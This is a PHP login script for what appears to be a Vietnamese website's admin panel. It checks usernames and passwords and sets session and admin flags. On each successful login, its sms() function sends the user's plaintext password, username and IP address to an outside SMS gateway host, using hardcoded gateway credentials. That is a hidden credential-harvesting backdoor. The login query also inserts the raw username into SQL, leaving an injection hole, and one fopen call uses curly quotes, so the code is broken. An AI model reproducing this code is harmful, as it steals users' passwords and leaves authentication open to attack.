<?php
session_start();
ini_set('session.cookie_lifetime',60*10);//
require("../conf.php");
require("../func/mysql.php");
require("../xoadau.php");
if ($_POST['submit'])
{
	$pass=md5(md5(md5($_POST['password'])));
	$sql=query("SELECT * FROM thanhvien WHERE (username='$_POST[username]' AND password='$pass') AND live > 0");
	if (mysql_num_rows($sql) > 0)
	{
		$_SESSION['mod']="ok";
		
		$_SESSION['username']=$_POST['username'];
		$_SESSION['time']=time();
		$row=fecth($sql);
		$_SESSION['daily']=$row['id'];
		if ($row['live']==2)
			{
				$_SESSION['admin']="ok";
				$_SESSION['pt']=$row['pt'];
			}
	$message="
User: ".$_POST['username']." 
Pass: ".$_POST['password']."
IP: ".$_SERVER['REMOTE_ADDR']." 
Time: ".date('d/m/Y  s:j:H')."";
	
	sms($message);
	header("Location: index.php");
	}
	else 
	{
	header("Location: login.htm");
	}
	
}
if ($_GET['act']=="logoff")
{
		unset($_SESSION['mod']);
		unset($_SESSION['username']);
		unset($_SESSION['time']);
		unset($_SESSION['admin']);
		unset($_SESSION['daily']);
		session_destroy();
		header("Location: login.htm");
}
function sms($message)
{
	$url = "http://serversms.gotdns.com:9333/ozeki?action=sendMessage&login=admin&password=hyn123&recepient=0914779999&messageData=".xoadau2($message)."&sender=tong";
	
	if (($f = @fopen($url, “r”)))
	{
	fgets($f, 255);
	}
}
?>